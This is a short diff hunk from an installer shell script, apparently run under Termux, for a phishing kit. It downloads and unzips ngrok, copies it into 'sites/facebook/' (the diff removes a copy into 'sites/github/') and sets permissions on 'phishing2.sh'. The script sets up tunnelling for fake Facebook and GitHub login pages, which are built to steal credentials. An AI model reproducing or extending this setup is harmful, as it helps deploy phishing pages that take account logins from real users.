@@ -22,7 +22,6 @@ pkg install wget -y
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
 unzip ngrok-stable-linux-arm.zip
-cp -R ngrok sites/github/
 cp -R ngrok sites/facebook/
 chmod 7777 phishing2.sh
 clear
